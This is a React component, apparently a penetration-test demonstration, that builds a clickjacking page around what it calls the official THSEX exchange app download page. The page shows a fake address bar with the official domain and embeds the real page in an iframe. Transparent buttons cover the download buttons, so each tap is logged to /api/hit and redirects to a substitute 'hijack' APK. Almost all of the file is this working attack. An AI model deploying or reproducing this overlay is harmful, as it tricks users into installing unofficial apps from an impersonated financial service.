"use client";

import { useState } from "react";

const REAL_URL = "https://thsexcex.online/#/pages/downapp/index";
const APK = "/THSEX6401.apk";

export default function IframeTrap() {
  const [showTrap, setShowTrap] = useState(false);
  const [status, setStatus] = useState("");

  async function hijackDownload() {
    setStatus("Downloading hijack APK (not official)...");
    try {
      await fetch("/api/hit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "overlay_click_apk_hijack" }),
      });
    } catch {
      /* ignore */
    }
    window.location.href = APK;
  }

  return (
    <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
      <div
        style={{
          background: "#1a1a1f",
          color: "#ccc",
          fontSize: 11,
          padding: "6px 10px",
          borderBottom: "1px solid #333",
          flexShrink: 0,
        }}
      >
        <div style={{ opacity: 0.75, marginBottom: 4, textAlign: "center" }}>
          PENTEST DEMO — user believes URL below (real bar shows attacker domain)
        </div>
        <div
          style={{
            background: "#2a2a32",
            borderRadius: 6,
            padding: "8px 12px",
            color: "#9fe8c8",
            fontSize: 13,
            textAlign: "center",
            fontWeight: 500,
          }}
        >
          thsexcex.online/#/pages/downapp/index
        </div>
      </div>

      <div style={{ position: "relative", flex: 1, overflow: "hidden" }}>
        {/* Real official page embedded — user sees authentic THSEX UI */}
        <iframe
          title="Real THSEX download page"
          src={REAL_URL}
          style={{
            width: "100%",
            height: "100%",
            border: 0,
            pointerEvents: "none",
          }}
        />

        {/* Full-screen tap layer — scroll not needed for demo; captures all taps */}
        <div
          style={{
            position: "absolute",
            inset: 0,
            zIndex: 5,
          }}
        >
          {/* Android download button zone */}
          <button
            type="button"
            aria-label="android-trap"
            onClick={hijackDownload}
            style={{
              position: "absolute",
              left: "6%",
              right: "6%",
              bottom: "10%",
              height: "16%",
              border: showTrap ? "3px dashed #ef4444" : "0",
              background: showTrap ? "rgba(239,68,68,0.3)" : "transparent",
              cursor: "pointer",
            }}
          />
          {/* iOS / second button zone */}
          <button
            type="button"
            aria-label="ios-trap"
            onClick={hijackDownload}
            style={{
              position: "absolute",
              left: "6%",
              right: "6%",
              bottom: "27%",
              height: "13%",
              border: showTrap ? "3px dashed #f97316" : "0",
              background: showTrap ? "rgba(249,115,22,0.25)" : "transparent",
              cursor: "pointer",
            }}
          />
        </div>
      </div>

      <div
        style={{
          position: "fixed",
          bottom: 8,
          right: 8,
          left: 8,
          zIndex: 20,
          display: "flex",
          justifyContent: "space-between",
          alignItems: "flex-end",
          pointerEvents: "none",
        }}
      >
        <a
          href="/ceo"
          style={{
            pointerEvents: "auto",
            fontSize: 11,
            color: "#888",
            background: "#111",
            padding: "6px 10px",
            borderRadius: 6,
            textDecoration: "none",
          }}
        >
          CEO explain
        </a>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6 }}>
          <button
            type="button"
            onClick={() => setShowTrap((v) => !v)}
            style={{
              pointerEvents: "auto",
              padding: "8px 12px",
              borderRadius: 8,
              border: "1px solid #555",
              background: "#111",
              color: "#fff",
              fontSize: 12,
            }}
          >
            {showTrap ? "Hide trap" : "Show trap (CEO)"}
          </button>
          {status && (
            <span
              style={{
                pointerEvents: "auto",
                fontSize: 11,
                color: "#4ade80",
                background: "#111",
                padding: "4px 8px",
                borderRadius: 4,
              }}
            >
              {status}
            </span>
          )}
        </div>
      </div>
    </div>
  );
}
